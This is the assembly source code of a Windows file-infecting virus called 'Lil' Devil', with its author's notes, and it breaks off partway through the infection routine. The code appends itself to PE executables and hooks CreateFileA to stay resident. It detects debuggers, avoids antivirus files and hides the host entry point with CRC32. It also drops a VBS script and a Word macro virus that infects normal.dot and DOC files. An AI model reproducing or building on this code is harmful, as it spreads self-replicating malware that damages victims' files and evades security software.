   ;
   ;  Lil' Devil
   ;  Coded by Bumblebee
   ;
   ;  DISCLAIMER
   ;  .This is the source code of a VIRUS. The  author  is not responsa-
   ;  bile of any damage that may occur due  to  the  assembly  of  this
   ;  file. Use it at your own risk.
   ;
   ;  Contents
   ;
   ;  1. Introduction
   ;  2. Features
   ;  3. Item Infection
   ;
   ;
   ;  1. Introduction
   ;
   ;  .This is a little research  virus that infects both PE EXE and DOC
   ;  files from ms word, including  normal.dot template. Not  optimized
   ;  at all, and with very lame vbs/wm code :/ I'm mainly ASM coder!
   ;  The idea is to add macro spreading to a average PE infector trying
   ;  to do it making the PE form of the virus as small as possible. For
   ;  this issue i'm going to use vbs to infect normal.dot, due this wsh
   ;  is required for dot infection (not for  PE  drop if there is a doc
   ;  infected, and of coz PE infection has nothing to be with vbs).
   ;
   ;  Even you've seen some part of this virus into Yonggary!, there are
   ;  some interesting things i'm sure you wanna check :) (like bug fix)
   ;
   ;  2. Features
   ;
   ;  .Has a runtime part that will infect current and windows folder.
   ;  .Infects PE files with at least 8000h bytes with EXE and SCR exts.
   ;  Infects appending virus body to the  end  of  the last section. It
   ;  takes care of virtual size and phys size data in the header,  that
   ;  is why the size of infected files increases more than other  virii
   ;  that doesn't take care of this. In other hand  it  makes the virus
   ;  infection more stable. It  uses size padding as infection sign. It
   ;  won't infect already infected files even size padding check fails.
   ;  .Avoids infect files that contains in body the  strings: 'tractor'
   ;  (self extractor archives) or 'ntivir' (antivirus software).
   ;  .Per-process resident by hooking CreateFileA. It checks the folder
   ;  used in the  calls (not file). It will infect all the  PE files in
   ;  this folder.
   ;  .Self CRC32 checksum implemented. Encrypts saved host EP with this
   ;  value. Since CRC32 is not stored, avers will need to calc CRC32 of
   ;  virus is order to  clean the  infected files. Self integrity check
   ;  will work also as kinda anti-debug feature.
   ;  .Has Softice  detection for win9x/win2k that will halt the process
   ;  with a stack fault.
   ;  .Contains a RLE compressed PE  dropper and a vbs script  that will
   ;  install word macros in the normal template. The word macro part is
   ;  full working macro  virus that will infect DOC files and will dump
   ;  and execute the PE dropper. The wm is generated on the fly.
   ;
   ;  3. Item Infection
   ;
   ;  .Virus working scheme:
   ;
   ;      PE --- PE dropper, infect, vbs dropper --> DOT
   ;        \--> PE
   ;
   ;      DOT --> DOC
   ;
   ;      DOC --> PE dropper --> PE
   ;
   ;  .The dropper is uncompressed into <WINDOWS FOLDER>/ldevrtl.dll and
   ;  infected. After that the  vbs dropper will be dumped into the file
   ;  <WINDOWS FOLDER>/ldevwm.vbs. Then the  macros  will  be  generated
   ;  into c:\ldev.sys. This wm will be used to infect  all docs and the
   ;  normal.dot. At  last the vbs  dropper will be  executed to install
   ;  the macros inside normal.dot. This won't  happen  again  while the
   ;  ldevrtl.dll exists. The  dropper  into  the  wm  won't  infect the
   ;  normal.dot, just infect PE  into  windows  and current folder. The
   ;  virus samples from  this  copy  will be able to infect word again.
   ;  .Even i've tried to not overload the system, the virus is not 100%
   ;  perfect. Just think what happens if word is running when we try to
   ;  infect normal.dot...
   ;
   ;
   ;   Thanx once again to Perikles for his tests. This  virus was quite
   ;  hard to test :) Nice work. He found  a stupid  bug i've incuded in
   ;  two old viruses: the way to low-case (don't rely  in  my  previous
   ;  lame 'or <reg>,202020h'). Also he  helped  a  lot  providing  with
   ;  infected samples to Balck Jack for the following tests.
   ;   Thanx you friend!
   ;
   ;    After i released the bin Black Jack did some tests under Win NT
   ;   with SP 5. He noticed infected prodump 'is not a valid win32 app'
   ;   even it runs nice under win98. Later he tested infected  mlink32
   ;   and it run without  problems.  procdump  has  a  quite  uncommon
   ;   last section attribute: discardable. We didn't get a good reason
   ;   to say why infected procdump didn't work under BJ's nt.  As  2nd
   ;   infected sample shown, last section huge virtual size is not the
   ;   problem. Sigh... i need to install win nt :/ Thanx  Black  Jack!
   ;    After speaking with Vecna we found the way i  calc  image  size
   ;   is kinda unstable hehehe. So this is the reason :) Keep this  in
   ;   mind when reading the PE infection routine.
   ;
   ;    Another thing you should know is some av detect it as  Yonggary
   ;   modification, and some detect it as  Yonggary  itself.  It's  my
   ;   fault coz i didn't tested av before releasing this virus. Indeed
   ;   this is at date of release. I spect after av ppl get a  infected
   ;   sample they will fix it (even detect it as Yonggary variant,  at
   ;   least they will detect it as  the  right  variant).  This  is  a
   ;   research virus, not spected to be itw.
   ;
   ;                                                  The way of the bee
   ;
   ;
   .486p
   locals
   .model flat,STDCALL

           extrn           ExitProcess:PROC        ; needed for 1st generation
           extrn           MessageBoxA:PROC

   ; from BC++ Win32 API on-line Reference
   WIN32_FIND_DATA         struc
   dwFileAttributes        dd      0
   dwLowDateTime0          dd      ?       ; creation
   dwHigDateTime0          dd      ?
   dwLowDateTime1          dd      ?       ; last access
   dwHigDateTime1          dd      ?
   dwLowDateTime2          dd      ?       ; last write
   dwHigDateTime2          dd      ?
   nFileSizeHigh           dd      ?
   nFileSizeLow            dd      ?
   dwReserved              dd      0,0
   cFileName               db      260 dup(0)
   cAlternateFilename      db      14 dup(0)
                           db      2 dup(0)
   WIN32_FIND_DATA         ends

   vSize           equ     vEnd-vBegin
   vVSize          equ     vVEnd-vBegin
   PADDING         equ     101
   MAXSTRING       equ     256

   ; my little debug macro with hardcoded addr for my system
   @debug   macro   title,reg
           pushad
           push    1000h
           call    @@tit
           db      title,0
   @@tit:
           push    reg
           push    0h
           mov     eax,0bff5412eh
           call    eax
           popad
   endm

   .DATA
           ; dummy data
           db      'WARNING - This is a virus carrier - WARNING'

   .CODE
   inicio:
           lea     esi,vBegin+5                    ; setup self CRC32
           mov     edi,vSize-5                     ; for 1st generation
           call    CRC32
           xor     dword ptr [hostEP],eax          ; hide host entry point

   align   200h    ; ignore tasm warning
   vBegin  label   byte
           push    offset fakeHost
   hostEP  equ     $-4
           pushad

           ; begin startup code
           call    getDelta

           lea     esi,vBegin+5+ebp                ; check self CRC32
           mov     edi,vSize-5                     ; it's ok
           call    CRC32
           xor     dword ptr [esp+20h],eax         ; restore host entry point
                                                   ; if CRC32 fails the
                                                   ; entry point will be faked
           ; relocation stuff
           mov     edx,offset vBegin               ; this allows infect
   virusEP equ     $-4                             ; relocatable hosts
           lea     eax,vBegin+ebp
           sub     eax,edx
           add     dword ptr [esp+20h],eax
           add     dword ptr [baseAddr+ebp],eax

           mov     edi,dword ptr [esp+24h]
           xor     edx,edx                         ; setup SEH frame
           lea     eax,dword ptr [esp-8h]
           xchg    eax,dword ptr fs:[edx]
           lea     esi,GetKernel32Exception+ebp
           push    esi
           push    eax

   GetKernel32Loop:                                ; loop to get Kernel32 addr
           dec     edi
           cmp     word ptr [edi],'ZM'             ; check is EXE
           jne     GetKernel32Loop
           mov     dx,word ptr [edi+3ch]           ; check has a right header
           test    dx,0f800h
           jnz     GetKernel32Loop
           cmp     edi,dword ptr [edi+edx+34h]     ; check addr fit in header
           jne     GetKernel32Loop

           xor     esi,esi                         ; remove SEH frame
           pop     dword ptr fs:[esi]
           pop     eax
                                                   ; now edi has k32 addr
           mov     esi,edi                         ; get API addr using CRC32
           mov     esi,dword ptr [esi+3ch]
           add     esi,edi
           mov     esi,dword ptr [esi+78h]
           add     esi,edi
           add     esi,1ch

           lodsd
           add     eax,edi
           mov     dword ptr [address+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [names+ebp],eax
           lodsd
           add     eax,edi
           mov     dword ptr [ordinals+ebp],eax

           sub     esi,16
           lodsd
           mov     dword ptr [nexports+ebp],eax

           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     eax,FSTAPI+ebp

   searchl:
           mov     esi,dword ptr [names+ebp]
           add     esi,edx
           mov     esi,dword ptr [esi]
           add     esi,edi
           push    eax edx edi
           xor     edi,edi
           movzx   di,byte ptr [eax+4]
           call    CRC32
           xchg    ebx,eax
           pop     edi edx eax
           cmp     ebx,dword ptr [eax]
           je      fFound
           add     edx,4
           inc     dword ptr [expcount+ebp]
           push    edx
           mov     edx,dword ptr [expcount+ebp]
           cmp     dword ptr [nexports+ebp],edx
           pop     edx
           je      retHost
           jmp     searchl
   fFound:
           shr     edx,1
           add     edx,dword ptr [ordinals+ebp]
           xor     ebx,ebx
           mov     bx,word ptr [edx]
           shl     ebx,2
           add     ebx,dword ptr [address+ebp]
           mov     ecx,dword ptr [ebx]
           add     ecx,edi
           mov     dword ptr [eax+5],ecx
           add     eax,9
           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     ecx,ENDAPI+ebp
           cmp     eax,ecx
           jb      searchl

           xor     eax,eax                         ; softice detection
           push    eax                             ; for win9x
           inc     edx
           push    edx
           push    00000003h
           push    eax
           inc     eax
           push    eax
           push    80000000h
           call    checkSice
   siwin9x db      '\\.\SICE',0
   sicemod equ     $-offset siwin9x
           db      '\\.\NTICE',0
   checkSice:
           mov     eax,dword ptr [_CreateFileA+ebp]
           shr     eax,16
           add     ax,-0bff7h
           jz      win9xDet
           add     dword ptr [esp],sicemod
   win9xDet:
           call    dword ptr [_CreateFileA+ebp]    ; open file
           inc     eax
           jz      notSice
           dec     eax
           call    dword ptr [_CloseHandle+ebp]

           call    $                               ; if found... fault!
   win32dasm0:
           jmp     win32dasm1                      ; avoid brute dissasm
                                                   ; (some versions)
           ; hehe lemme explain this. I've noticed in the past
           ; win32dasm will enter a infinite loop if you put this:
           ;
           ; one: jmp two
           ; two: jmp one
           ;
           ; Of coz program flow won't enter there... Just for some
           ; win32dasm versions.
   notSice:
           mov     dword ptr [multiThread+ebp],1   ; set to free
           ; per-process residency... Hook CreateFileA if available
           mov     ecx,dword ptr [_CreateFileA+ebp]
           mov     dword ptr [CFAhookRet+ebp],ecx  ; setup CreateFileA
                                                   ; ret addr
           mov     eax,400000h                     ; this is setup at
   baseAddr        equ $-4                         ; inf time
           lea     esi,CreateFileAHook+ebp
           call    APIHook                         ; hook CreateFileA

           inc     byte ptr [infWord+ebp]

           ; infect current folder
           call    infectFolder

           ; infect windows folder
           lea     esi,buffer0+ebp                ; get current directory
           push    esi
           push    MAXSTRING
           call    dword ptr [_GetCurrentDirectoryA+ebp]
           or      eax,eax
           jz      chuchu

           push    MAXSTRING                       ; get windows directory
           lea     esi,buffer1+ebp
           push    esi
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      chuchu

           lea     esi,buffer1+ebp                 ; goto windows directory
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]
           or      eax,eax
           jz      chuchu

           call    infectFolder

           lea     esi,buffer0+ebp                 ; go back home
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

           dec     byte ptr [infWord+ebp]

           cmp     byte ptr [infWord+ebp],0        ; check if we must infect
           jne     installMacros                   ; word
   chuchu: inc     byte ptr [infWord+ebp]          ; enable word infection for
           jmp     retHost                         ; per-process infected files

   installMacros:
           ; begin wm infection code
           ; 1st we need to expand the dropper to be able to infect it
           ; alternate way to get memory... i know i can add this size
           ; to virtual mem, or use stack, but i've thought i can
           ; show ya this way to get mem.
           xor     eax,eax                         ; get some mem
           push    eax                             ; dropper size=1036 bytes
           push    1036
           push    eax
           push    00000004h
           push    eax
           dec     eax
           push    eax
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax
           jz      retHost

           mov     dword ptr [fHnd2+ebp],eax

           xor     ebx,ebx                         ; map a view for the obj
           push    ebx
           push    ebx
           push    ebx
           push    00000004h OR 00000002h
           push    eax
           call    dword ptr [_MapViewOfFile+ebp]
           or      eax,eax
           jz      retHost

           mov     dword ptr [mHnd+ebp],eax

           ;
           ; the dropper does nothing but end the app, it's assembled
           ; with nasm (alink links it in a very tiny file)
           ;
           ; i've implemented a RLE compression algorithm very
           ; close to PCX compession with little improvements
           ;
           ; plain file: 1036 bytes (nasm+alink rockz!)
           ; compressed:  245 bytes (uh uh)
           ;
           ; Is fast, clean and in this case archieves a good
           ; compression ratio. Expand code is also small :)
           ;
           xor     ecx,ecx                         ; expand the RLEed
           mov     edx,1036                        ; dropper
           lea     esi,drop+ebp
           mov     edi,eax
   expandLoop:
           test    byte ptr [esi],128
           jnz     expRep
           mov     cl,byte ptr [esi]
           and     cl,127
           sub     edx,ecx
           inc     esi
           rep     movsb
           cmp     edx,0
           jne     expandLoop
           jmp     endExpand
   expRep:
           mov     cl,byte ptr [esi]
           inc     esi
           lodsb
           and     cl,127
           sub     edx,ecx
           rep     stosb
           cmp     edx,0
           jne     expandLoop
   endExpand:
           ; here ends the expand code :)
           ; why to not copy & paste this code? hehe fuck! understand it.
           ; is pretty easy RLE compression, and may be you would like
           ; to improve it for your spezial case. Moreover i've not
           ; included the code to compress the dropper hehehe.
           ; uhm however you can use my compressed dropper and the code
           ; to uncompress it, of coz.

           push    MAXSTRING                       ; get windows directory
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      retHost

           lea     esi,tmpfilename+ebp
           push    esi
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_lstrcat+ebp]

           ; spawn it to disk at '<WINDOWS FOLDER>/ldevrtl.dll'
           ; if this fails... well it's a flag. I assume it is there and
           ; we've infected normal.dot yet.
           xor     eax,eax
           push    eax
           push    00000080h
           push    00000001h
           push    eax
           push    eax
           push    40000000h
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_CreateFileA+ebp]
           inc     eax
           jz      skipSpawn
           dec     eax

           push    eax                             ; save file handle
           push    0                               ; write it all
           lea     esi,address+ebp
           push    esi                             ; shit
           push    1036                            ; size
           push    dword ptr [mHnd+ebp]            ; buffer to write
           push    eax                             ; file handle
           call    dword ptr [_WriteFile+ebp]
           pop     eax

           push    eax                             ; close file
           call    dword ptr [_CloseHandle+ebp]

           mov     byte ptr [infWord+ebp],0        ; disable word infection

           lea     esi,buffer0+ebp                 ; infect it
           call    infect

           inc     byte ptr [infWord+ebp]          ; enable word infection

           ; uhm. This is nice to not overload the system and to make
           ; the virus algo more nice. Dropper will be infected with
           ; wm infection disabled. When a DOC spawns this dropper only
           ; PE files will be infected. Later, a infected PE file will
           ; infect normal.dot.

   skipSpawn:
           push    dword ptr [mHnd+ebp]            ; free tmp mem
           call    dword ptr [_UnmapViewOfFile+ebp]

           push    dword ptr [fHnd2+ebp]
           call    dword ptr [_CloseHandle+ebp]

           ; now spawn vbs code
           push    MAXSTRING                       ; get windows directory
           lea     esi,buffer1+ebp                 ; again
           push    esi
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      retHost

           lea     esi,vbsfilename+ebp
           push    esi
           lea     esi,buffer1+ebp
           push    esi
           call    dword ptr [_lstrcat+ebp]

           ; spawn it to disk at '<WINDOWS FOLDER>/ldevwm.vbs'
           ; This is the only one suspicious file that remains after
           ; the spawns. ldev.sys, ldevrtl.dll and ldev.exe (system and
           ; hidden attributes) are more stealthy.
           ; I thought to delete it after wm infection, but vbs execution
           ; it's kinda slow... and gives some problems if we try to
           ; delete it in a bad time. So it remains there.
           xor     eax,eax
           push    eax
           push    00000080h
           push    00000001h
           push    eax
           push    eax
           push    40000000h
           lea     esi,buffer1+ebp
           push    esi
           call    dword ptr [_CreateFileA+ebp]
           inc     eax
           jz      retHost
           dec     eax

           push    eax                             ; save file handle
           push    0                               ; write it all
           lea     esi,address+ebp
           push    esi                             ; shit
           push    vbsdroplen                      ; size
           lea     esi,vbsdrop+ebp
           push    esi                             ; buffer to write
           push    eax                             ; file handle
           call    dword ptr [_WriteFile+ebp]
           pop     eax

           push    eax                             ; close file
           call    dword ptr [_CloseHandle+ebp]

           ; now generate macro at 'c:\ldev.sys'
           ; 1st open the infected dropper
           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h
           lea     esi,buffer0+ebp
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open the file R
           inc     eax
           jz      retHost
           dec     eax

           mov     dword ptr [fHnd+ebp],eax

           push    0h
           push    eax
           call    dword ptr [_GetFileSize+ebp]    ; get file size
           inc     eax
           jz      dropMacroErrorClose
           dec     eax

           mov     dword ptr [fileSize+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000002h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]     ; file mapping
           or      eax,eax
           jz      dropMacroErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view
           or      eax,eax
           jz      dropMacroErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

           ; 2nd open the file to build macro
           xor     eax,eax
           push    eax
           push    00000080h
           push    00000001h
           push    eax
           push    eax
           push    40000000h
           lea     esi,macrofilename+ebp
           push    esi
           call    dword ptr [_CreateFileA+ebp]
           inc     eax
           jz      dropMacroErrorCloseUnmap
           dec     eax

           mov     dword ptr [fHnd2+ebp],eax

           ; write pre-built part
           push    0                               ; write it all
           lea     esi,address+ebp
           push    esi                             ; shit
           push    wordmacrolen                    ; size
           lea     esi,wordmacro+ebp
           push    esi                             ; buffer to write
           push    eax                             ; file handle
           call    dword ptr [_WriteFile+ebp]

           mov     byte ptr [presub+12+ebp],'a'    ; fix subs

           mov     eax,dword ptr [fileSize+ebp]    ; calc how many subs
           mov     cx,512                          ; div 512
           xor     edx,edx
           div     cx
           xor     ecx,ecx
           mov     cl,al
           or      dl,dl
           jz      notReminder
           inc     ecx
   notReminder:
           push    ecx
           mov     al,'a'
           lea     esi,buffer0+ebp
           push    esi
   genCallSubs:                                    ; gen subs
           mov     byte ptr [esi],al
           inc     al
           mov     word ptr [esi+1],0a0dh
           add     esi,3
           loop    genCallSubs
           pop     edi
           sub     esi,edi

           ; write it
           push    0                               ; write it all
           lea     edi,address+ebp
           push    edi                             ; shit
           push    esi                             ; size
           lea     edi,buffer0+ebp
           push    edi                             ; buffer to write
           push    dword ptr [fHnd2+ebp]           ; file handle
           call    dword ptr [_WriteFile+ebp]

           ; write end of main sub drop
           push    0                               ; write it all
           lea     edi,address+ebp
           push    edi                             ; shit
           push    closedus                        ; size
           lea     edi,closedu+ebp
           push    edi                             ; buffer to write
           push    dword ptr [fHnd2+ebp]           ; file handle
           call    dword ptr [_WriteFile+ebp]

           ; encode the dropper inside the macro
           pop     ecx                             ; number of subs
           mov     al,0
           xor     ebx,ebx
           lea     edi,buffer0+ebp
           mov     edx,dword ptr [mapMem+ebp]

   macroEncodeLoop:
           lea     esi,presub+ebp                  ; sub line
           call    mlstrcpy
           add     byte ptr [edi-5],al            ; increse letter
           inc     al

           push    ecx
           mov     ecx,8
   nEncLines:
           lea     esi,letlin+ebp                  ; begining of enc line
           call    mlstrcpy

           push    ecx eax
           mov     esi,edx
           sub     esi,dword ptr [mapMem+ebp]
           mov     ecx,dword ptr [fileSize+ebp]
           sub     ecx,esi
           cmp     ecx,64
           jb      lastEncLoop
                                                   ; encode 8 lines
           mov     ecx,64                          ; to write
   lastEncLoop:                                    ; 512 bytes (64*8)
           call    enc2ascii
           pop     eax ecx

           lea     esi,putlin+ebp                  ; write line
           call    mlstrcpy

           mov     esi,edx
           sub     esi,dword ptr [mapMem+ebp]
           sub     esi,dword ptr [fileSize+ebp]
           jz      encMacroDone

           loop    nEncLines
   encMacroDone:
           pop     ecx

           lea     esi,endsub+ebp                  ; end of sub
           call    mlstrcpy

           loop    macroEncodeLoop

           ; write it
           push    0                               ; write it all
           lea     edi,address+ebp
           push    edi                             ; shit
           push    ebx                             ; size
           lea     edi,buffer0+ebp
           push    edi                             ; buffer to write
           push    dword ptr [fHnd2+ebp]           ; file handle
           call    dword ptr [_WriteFile+ebp]

           push    dword ptr [fHnd2+ebp]           ; close file
           call    dword ptr [_CloseHandle+ebp]

           ; now exec our vbs shit
           ; load shell32.dll and get shellexeca func
           ; that will look for the needed app to exec the vbs file
           lea     esi,shell32dll+ebp
           push    esi
           call    dword ptr [_LoadLibraryA+ebp]
           or      eax,eax
           jz      dropMacroErrorCloseUnmap

           push    eax
           lea     esi,shellexec+ebp
           push    esi
           push    eax
           call    dword ptr [_GetProcAddress+ebp]
           or      eax,eax
           jz      freeTheLib

           mov     edx,eax
           xor     eax,eax
           push    eax
           push    eax
           push    eax
           lea     esi,buffer1+ebp
           push    esi
           push    eax
           push    eax
           call    edx                             ; shell exec!

   freeTheLib:
           ; this is kinda important call, if we don't release this
           ; library the system will become lil overloaded soon. That's
           ; why even virus finishes the app will have the dll loaded.
           call    dword ptr [_FreeLibrary+ebp]

   dropMacroErrorCloseUnmap:
           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

   dropMacroErrorCloseMap:
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

   dropMacroErrorClose:
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CloseHandle+ebp]

   retHost:                                        ; return to host
           popad
           ret

   win32dasm1:                                     ; will fake some
           jmp     win32dasm0                      ; win32dasm versions

   GetKernel32Exception:                           ; uh? buaah :)
           xor     edi,edi                         ; restore shit
           mov     eax,dword ptr fs:[edi]
           mov     esp,dword ptr [eax]
           pop     dword ptr fs:[edi]
           pop     eax
           jmp     retHost                         ; return host :/

   ;
   ; weird routine :/ Probably the most dirty code i've code ever. hehe
   ;
   enc256:
           mov     word ptr [edi],' &'
           add     edi,2
           add     ebx,2
   enc2ascii:
           lea     esi,chrlin+ebp
           call    mlstrcpy

           push    ecx
           xor     eax,eax
           mov     al,byte ptr [edx]

           push    edx ecx
           push    eax
           xor     edx,edx
           mov     cl,100
           div     cl
           mov     dl,al
           add     al,'0'
           mov     byte ptr [edi],al
           inc     edi
           pop     eax
           or      dl,dl
           jz      noDecCent
           push    ecx
           xor     ecx,ecx
           mov     cl,dl
   decCent:
           sub     al,100
           loop    decCent
           pop     ecx
   noDecCent:
           push    eax
           xor     edx,edx
           mov     cl,10
           div     cl
           mov     dl,al
           add     al,'0'
           mov     byte ptr [edi],al
           inc     edi
           pop     eax
           or      dl,dl
           jz      noDecDec
           push    ecx
           xor     ecx,ecx
           mov     cl,dl
   decDec:
           sub     al,10
           loop    decDec
           pop     ecx
   noDecDec:
           add     al,'0'
           mov     byte ptr [edi],al
           inc     edi

           add     ebx,3
           pop     ecx edx

           mov     word ptr [edi],' )'
           add     edi,2
           add     ebx,2

           pop     ecx
           inc     edx
           loop    enc256
   encEndOfFile:
           mov     ax,0a0dh
           mov     word ptr [edi],ax
           add     edi,2
           add     ebx,2
           ret

   ;
   ; This routine gets current delta offset.
   ;
   getDelta:
           call    deltaOffset
   deltaOffset:
           pop     ebp
           sub     ebp,offset deltaOffset
           ret
   ;
   ; This routine makes CRC32.
   ;
   CRC32:
       cld
           xor     ecx,ecx
           dec     ecx
       mov     edx,ecx
       push    ebx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:
           dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
           dec     edi
       jnz     NextByteCRC
       pop     ebx
       not     edx
       not     ecx
       mov     eax,edx
       rol     eax,16
       mov     ax,cx
       ret
   ;
   ; Infects PE file increasing last section.
   ;
   infect:
           pushad
           mov     dword ptr [fNameAddr+ebp],esi   ; save filename
                                                   ; addr for later
           push    esi
           push    esi
           call    dword ptr [_GetFileAttributesA+ebp]     ; get...
           pop     esi
           inc     eax
           jz      infectionError
           dec     eax

           mov     dword ptr [fileAttrib+ebp],eax

           push    esi
           push    00000080h
           push    esi
           call    dword ptr [_SetFileAttributesA+ebp]     ; clean file
           pop     esi                                     ; attributes
           or      eax,eax
           jz      infectionError

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h OR 40000000h
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open the file RW
           inc     eax
           jz      infectionErrorAttrib
           dec     eax

           mov     dword ptr [fHnd+ebp],eax

           push    0h
           push    eax
           call    dword ptr [_GetFileSize+ebp]    ; get file size
           inc     eax
           jz      infectionErrorClose
           dec     eax

           mov     dword ptr [fileSize+ebp],eax

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_GetFileTime+ebp]    ; get... :)
           or      eax,eax
           jz      infectionErrorClose

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]     ; file mapping
           or      eax,eax
           jz      infectionErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; map a view
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

           mov     edi,eax
           cmp     word ptr [edi],'ZM'             ; check is exe
           jne     infectionErrorCloseUnmap

           add     edi,dword ptr [edi+3ch]         ; check is PE
           cmp     eax,edi                         ; take care of strange
           ja      infectionErrorCloseUnmap        ; DOS headers
           add     eax,dword ptr [fileSize+ebp]
           cmp     eax,edi
           jb      infectionErrorCloseUnmap
           cmp     word ptr [edi],'EP'
           jne     infectionErrorCloseUnmap

           movzx   edx,word ptr [edi+16h]          ; check executable type:
           test    edx,2h                          ; check is executable
           jz      infectionErrorCloseUnmap
           test    edx,2000h                       ; check not DLL
           jnz     infectionErrorCloseUnmap
           movzx   edx,word ptr [edi+5ch]
           dec     edx                             ; check not native
           jz      infectionErrorCloseUnmap

           pushad
           mov     ecx,seflextractors
           lea     esi,seflextractor+ebp
           mov     eax,dword ptr [mapMem+ebp]
           mov     edx,dword ptr [fileSize+ebp]
           call    searchStringz                   ; check is not self-extractor
           popad                                   ; file
           jnc     infectionErrorCloseUnmap

           pushad
           mov     ecx,antiviruss
           lea     esi,antivirus+ebp
           mov     eax,dword ptr [mapMem+ebp]
           mov     edx,dword ptr [fileSize+ebp]
           call    searchStringz                   ; check is not antivirus
           popad                                   ; file
           jnc     infectionErrorCloseUnmap

           mov     esi,edi

           mov     eax,18h                         ; goto last section
           add     ax,word ptr [edi+14h]
           add     edi,eax
           movzx   ecx,word ptr [esi+06h]
           dec     ecx
           mov     eax,28h
           xor     edx,edx
           mul     cx
           add     edi,eax

           mov     eax,dword ptr [edi+24h]
           and     eax,0e0000020h
           cmp     eax,0e0000020h                  ; infected yet? :?
           je      infectionErrorCloseUnmap

           mov     edx,dword ptr [edi+08h]         ; first fix
           cmp     edx,dword ptr [edi+10h]
           jbe     skipFixRVA0

           mov     dword ptr [edi+10h],edx

   skipFixRVA0:
           mov     eax,dword ptr [edi+0ch]         ; calc new EP
           add     eax,dword ptr [edi+10h]
           push    eax
           add     eax,dword ptr [esi+34h]         ; relocation stuff
           mov     dword ptr [virusEP+ebp],eax
           pop     eax
           xchg    eax,dword ptr [esi+28h]
           mov     edx,dword ptr [esi+34h]

           add     eax,edx
           mov     dword ptr [baseAddr+ebp],edx    ; for API hook
           mov     dword ptr [hostEP+ebp],eax      ; save old EP

           mov     eax,dword ptr [edi+14h]         ; setup EP addr in file
           add     eax,dword ptr [edi+10h]
           mov     dword ptr [epAddr+ebp],eax

           or      dword ptr [edi+24h],0e0000020h  ; set sect properties
           and     dword ptr [edi+24h],NOT 10000000h ; avoid shared section
           xor     eax,eax
           mov     dword ptr [esi+58h],eax         ; zero PE checksum

           mov     eax,vSize                       ; the section phys size
           add     eax,dword ptr [edi+10h]
           mov     ecx,dword ptr [esi+3ch]
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx

           mov     dword ptr [edi+10h],eax         ; store the phys size

           mov     edx,dword ptr [edi+08h]         ; quit curr virt size
           sub     dword ptr [esi+50h],edx
           mov     edx,dword ptr [edi+10h]         ; calc new Virt size
           cmp     edx,dword ptr [edi+08h]         ; i fix the section
           jbe     skipFixRVA                      ; if phys>virt
           mov     dword ptr [edi+08h],edx         ; virt=phys
   skipFixRVA:

           mov     eax,vVSize                      ; increase with virus
           add     eax,dword ptr [edi+08h]         ; virt size
           mov     ecx,dword ptr [esi+38h]
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx

           add     dword ptr [esi+50h],eax         ; fix the image size
           mov     dword ptr [edi+08h],eax         ; fix the virtual size

           mov     eax,dword ptr [edi+10h]         ; phys size last sect
           add     eax,dword ptr [edi+14h]         ; plus phys offset
           mov     ecx,PADDING                     ; calc file padding
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx
           mov     dword ptr [pad+ebp],eax

           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp]

           push    dword ptr [fhmap+ebp]
           call    dword ptr [_CloseHandle+ebp]

           xor     eax,eax
           push    eax
           push    dword ptr [pad+ebp]
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax
           jz      infectionErrorClose

           mov     dword ptr [fhmap+ebp],eax

           xor     eax,eax
           push    dword ptr [pad+ebp]
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax

